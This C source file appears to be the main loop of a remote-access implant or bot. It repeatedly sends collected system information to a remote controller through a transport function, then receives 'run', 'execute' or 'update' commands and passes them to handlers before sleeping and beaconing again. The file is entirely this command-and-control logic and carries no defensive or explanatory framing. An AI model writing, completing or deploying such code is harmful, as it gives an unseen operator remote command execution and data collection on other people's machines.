#include "events.h"

void event_loop() {
    char *sysinfo = 0;

    while (1) {
        struct buffer command = {0};
        struct buffer params = {0};

        get_sysinfo_str(&sysinfo);

        char *info_cmd = "info";

        struct buffer sysinfo_buf = {
                ptr: sysinfo,
                size: strlen(sysinfo)
        };

        int ret = transport_send(info_cmd, &sysinfo_buf, &command, &params);

        if (!ret) {
            goto clean;
        }

        if (!command.size) {
            goto clean;
        }
        char *run_cmd = "run";

        if (!strncmp(command.ptr, run_cmd, command.size)) {
            buf_to_str(&params);
            run_handler(&params);

            goto clean;
        }
        char *execute_cmd = "execute";

        if (!strncmp(command.ptr, execute_cmd, command.size)) {
            exec_handler(&params);

            goto clean;
        }
        char *update_cmd = "update";

        if (!strncmp(command.ptr, update_cmd, command.size)) {
            update_handler(&params);
        }

        clean:

        if (command.size) {
            free(command.ptr);
        }

        if (params.size) {
            free(params.ptr);
        }

        sleep(RETRY_CONNECT);
        continue;
    }
}
